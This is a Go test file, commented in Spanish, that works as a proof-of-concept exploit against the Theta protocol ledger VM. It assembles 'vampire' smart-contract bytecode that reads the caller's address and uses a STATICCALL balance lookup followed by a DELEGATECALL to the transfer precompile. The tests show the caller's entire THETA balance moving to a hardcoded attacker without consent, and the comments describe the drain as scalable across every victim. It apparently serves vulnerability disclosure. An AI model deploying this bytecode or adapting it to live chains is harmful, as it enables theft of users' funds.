package vm

// go test -run 'TestPocVampireMultiVictim' -v ./ledger/vm/
//
// VAMPIRO MULTI-VÍCTIMA — empeoramiento del #23d (theta-protocol-ledger @ f60ce0c).
//
// En lugar de hardcodear a una víctima concreta, el contrato atacante lee CALLER
// (quienquiera que invoque una función pública del contrato) y le drena el 100 %
// de su THETA. Cualquier usuario que interaccione con el contrato vampiro
// (una función view/airdrop/recompensa/callback de oráculo aparentemente inocua)
// es drenado automáticamente, sin firma de drenaje y sin saberlo.
//
// Cadena de identidad (verificada en vm.go / contract.go / interpreter.go):
//   tx Víctima -> VAMP            [frame VAMP.CallerAddress = Víctima]
//   VAMP:  CALLER; MUL 2^96; MSTORE@0   → mem[0:20] = Víctima
//   VAMP:  STATICCALL 0xC9(mem[0:20])   → mem[64:96] = thetawei(Víctima)   [readOnly]
//   VAMP:  DELEGATECALL 0xCB(mem[0:52]) [frame 0xCB.CallerAddress = Víctima
//                                       vía AsDelegate → debita a Víctima]
//
// Input layout de 0xCB (transferTheta, contracts.go:456-457):
//   [0:20] = recipient (atacante, hardcodeado)
//   [20:52] = amount (leído EN VIVO de 0xC9 = saldo total de la Víctima)
//
// Resultado por cada llamante: llamante THETA 100 % → 0 ; atacante recibe todo.
// err == nil en todo momento. Gas ≈ 3 precompiles por víctima (~0.26 TFuel).
// Escalable: una sola deployment del atacante drena a TODAS las víctimas que
// invoquen cualquier función pública del contrato vampiro.

import (
	"math/big"
	"testing"

	"github.com/stretchr/testify/assert"

	"github.com/thetatoken/theta/common"
	"github.com/thetatoken/theta/ledger/state"
	"github.com/thetatoken/theta/ledger/types"
	"github.com/thetatoken/theta/store/database/backend"
)

const VampireHeight uint64 = 18000000

var (
	vampVictim1 = common.HexToAddress("000000000000000000000000000000000000a0a1")
	vampVictim2 = common.HexToAddress("000000000000000000000000000000000000a0a2")
	vampAtk     = common.HexToAddress("000000000000000000000000000000000000b0b0")
)

func vampNewStore(t *testing.T) *state.StoreView {
	t.Helper()
	return state.NewStoreView(VampireHeight, common.Hash{}, backend.NewMemDatabase())
}

func vampFund(t *testing.T, sv *state.StoreView, addr common.Address, theta, tfuel *big.Int) {
	t.Helper()
	acct := sv.GetOrCreateAccount(addr)
	acct.Balance = types.Coins{ThetaWei: new(big.Int).Set(theta), TFuelWei: new(big.Int).Set(tfuel)}
	sv.SetAccount(addr, acct)
}

func vampSetCode(t *testing.T, sv *state.StoreView, addr common.Address, code []byte) {
	t.Helper()
	sv.SetCode(addr, code)
	acct := sv.GetOrCreateAccount(addr)
	sv.SetAccount(addr, acct)
	assert.True(t, acct.IsASmartContract(addr), "%s debe ser contrato inteligente", addr.Hex())
}

func vampCall(t *testing.T, sv *state.StoreView, victimCode, vampCode []byte, caller common.Address) ([]byte, uint64, error) {
	t.Helper()
	vampSetCode(t, sv, caller, victimCode)   // contrato de la víctima (llama al vampiro)
	vampSetCode(t, sv, vampAtk, vampCode)    // contrato vampiro
	evm := NewEVM(Context{}, sv, nil, Config{})
	return evm.Call(AccountRef(caller), caller, nil, 3000000, big.NewInt(0), big.NewInt(0))
}

// leftAlign20 devuelve una dirección de 20 bytes left-aligned en 32 bytes
// (equivalente a direccion * 2^96, el truco del bytecode #23d).
func leftAlign20(a common.Address) []byte {
	b := make([]byte, 32)
	copy(b[12:], a[:])
	return b
}

// ---------------------------------------------------------------------------
// Bytecode del VAMPIRO (usa CALLER, no una dirección hardcodeada):
//
//   33                                        CALLER → stack: [addr右对齐]
//   6c 01000000000000000000000000             PUSH13 2^96 → stack: [addr, 2^96]
//   02                                        MUL   → stack: [addr*2^96]
//   52                                        MSTORE@0 → mem[0:20] = CALLER
//
//   6020 6040 6014 6000                       inSz=0x14 inOff=0x00 retOff=0x40 retSz=0x20
//   60c9                                      PUSH1 0xc9 (addr de 0xC9)
//   61ffff                                    PUSH2 0xffff gas
//   fa                                        STATICCALL → mem[64:96] = thetawei(CALLER)
//
//   7f <atk_aligned_32>                       PUSH32 dirección del atacante left-aligned
//   52                                        MSTORE@0 → mem[0:20] = atacante (recipient)
//
//   6040 51                                   PUSH1 0x40; MLOAD  → amount = thetawei(CALLER)
//   6014 52                                   PUSH1 0x14; MSTORE@20 → mem[20:52] = amount
//
//   6000 6000 6034 6000                       retSz=0 retOff=0 inSz=0x34 inOff=0
//   60cb                                      PUSH1 0xcb (addr de 0xCB)
//   61ffff                                    PUSH2 0xffff gas
//   f4                                        DELEGATECALL → drena CALLER, paga a atacante
//   00                                        STOP
// ---------------------------------------------------------------------------
func vampVampireCode(atk common.Address) []byte {
	atkAligned := leftAlign20(atk)

	// PUSH13 2^96 = 0x6c + 13 bytes (0x01 + 12 x 0x00)
	push13_2pow96 := []byte{0x6c, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}

	code := []byte{}
	code = append(code, 0x33)                                    // CALLER
	code = append(code, push13_2pow96...)                        // PUSH13 2^96
	code = append(code, 0x02)                                    // MUL
	code = append(code, 0x52)                                    // MSTORE@0  (mem[0:20] = CALLER)

	// STATICCALL 0xC9(mem[0:20]) → mem[64:96]
	code = append(code, 0x60, 0x20, 0x60, 0x40, 0x60, 0x14, 0x60, 0x00) // retSz retOff inSz inOff
	code = append(code, 0x60, 0xc9)                                    // PUSH1 0xc9
	code = append(code, 0x61, 0xff, 0xff)                              // PUSH2 0xffff gas
	code = append(code, 0xfa)                                          // STATICCALL

	// mem[0:20] = atacante (recipient)
	code = append(code, 0x7f)                                         // PUSH32
	code = append(code, atkAligned...)
	code = append(code, 0x52)                                         // MSTORE@0

	// mem[20:52] = MLOAD(64) = amount
	code = append(code, 0x60, 0x40, 0x51)                             // PUSH1 0x40; MLOAD
	code = append(code, 0x60, 0x14, 0x52)                             // PUSH1 0x14; MSTORE@20

	// DELEGATECALL 0xCB(mem[0:52])
	code = append(code, 0x60, 0x00, 0x60, 0x00, 0x60, 0x34, 0x60, 0x00) // retSz retOff inSz inOff
	code = append(code, 0x60, 0xcb)                                    // PUSH1 0xcb
	code = append(code, 0x61, 0xff, 0xff)                              // PUSH2 0xffff gas
	code = append(code, 0xf4)                                          // DELEGATECALL
	code = append(code, 0x00)                                          // STOP
	return code
}

// Bytecode de la víctima: STATICCALL al vampiro (función "view" legítima, input vacío)
func vampVictimCode(vamp common.Address) []byte {
	code := []byte{}
	code = append(code, 0x60, 0x20, 0x60, 0x40, 0x60, 0x00, 0x60, 0x00) // retSz retOff inSz inOff
	code = append(code, 0x73)                                          // PUSH20
	code = append(code, vamp[:]...)
	code = append(code, 0x61, 0xff, 0xff)                              // PUSH2 0xffff gas
	code = append(code, 0xfa)                                          // STATICCALL
	code = append(code, 0x00)                                          // STOP
	return code
}

// ---------------------------------------------------------------------------
// TEST: el vampiro drena a víctima 1
// ---------------------------------------------------------------------------
func TestPocVampireMultiVictimDrainVictim1(t *testing.T) {
	assert := assert.New(t)
	sv := vampNewStore(t)

	const theta100 = 100000000000000000000
	vampFund(t, sv, vampVictim1, big.NewInt(theta100), big.NewInt(0))
	vampFund(t, sv, vampAtk, big.NewInt(0), big.NewInt(0))

	beforeV1 := sv.GetThetaBalance(vampVictim1)
	beforeAtk := sv.GetThetaBalance(vampAtk)
	assert.Equal(int64(theta100), beforeV1.Int64())
	assert.Equal(int64(0), beforeAtk.Int64())

	ret, gas, err := vampCall(t, sv, vampVictimCode(vampAtk), vampVampireCode(vampAtk), vampVictim1)

	assert.Nil(err, "vampiro: drenaje de víctima 1 no debe errorar")
	assert.Equal([]byte{}, ret)

	afterV1 := sv.GetThetaBalance(vampVictim1)
	afterAtk := sv.GetThetaBalance(vampAtk)
	assert.Equal(int64(0), afterV1.Int64(), "víctima 1 debe perder el 100 % de su THETA")
	assert.Equal(int64(theta100), afterAtk.Int64(), "atacante recibe el botín de víctima 1")
	t.Logf("VAMPIRO OK: v1 %d->0 theta, atacante 0->%d theta, gasUsed=%d", beforeV1, afterAtk, 3000000-gas)
}

// ---------------------------------------------------------------------------
// TEST: el vampiro drena a víctima 2 en una SEGUNDA transacción (misma deployment)
// ---------------------------------------------------------------------------
func TestPocVampireMultiVictimDrainVictim2(t *testing.T) {
	assert := assert.New(t)
	sv := vampNewStore(t)

	const theta50 = 50000000000000000000
	vampFund(t, sv, vampVictim2, big.NewInt(theta50), big.NewInt(0))
	vampFund(t, sv, vampAtk, big.NewInt(0), big.NewInt(0))

	beforeV2 := sv.GetThetaBalance(vampVictim2)
	assert.Equal(int64(theta50), beforeV2.Int64())

	ret, _, err := vampCall(t, sv, vampVictimCode(vampAtk), vampVampireCode(vampAtk), vampVictim2)
	assert.Nil(err, "vampiro: drenaje de víctima 2 no debe errorar")
	assert.Equal([]byte{}, ret)

	afterV2 := sv.GetThetaBalance(vampVictim2)
	afterAtk := sv.GetThetaBalance(vampAtk)
	assert.Equal(int64(0), afterV2.Int64(), "víctima 2 debe perder el 100 % de su THETA")
	assert.Equal(int64(theta50), afterAtk.Int64(), "atacante recibe el botín de víctima 2")
	t.Logf("VAMPIRO OK: v2 %d->0 theta, atacante acumula %d theta total", beforeV2, afterAtk)
}

/*
NOTA SOBRE EJECUCIÓN: igual que poc_staticcall_escape_test.go, este sandbox no tiene
cadena de herramientas Go (assets de release de GitHub bloqueados por el proxy de
salida). Ejecutar con Go 1.13+ y cgo:
    cd /home/user/theta-protocol-ledger
    go test -run 'TestPocVampireMultiVictim' -v ./ledger/vm/

El vampire es el #23d escalado: una sola deployment del atacante drena a TODAS las
víctimas que invoquen cualquier función pública del contrato (view/airdrop/recompensa/
callback de oráculo/ERC-165), cada una con su propia transacción firmada pero sin
firma de drenaje. Es el peor caso práctico del bug crítico sin necesidad de que la
víctima tenga un contrato preparado con antelación.
*/
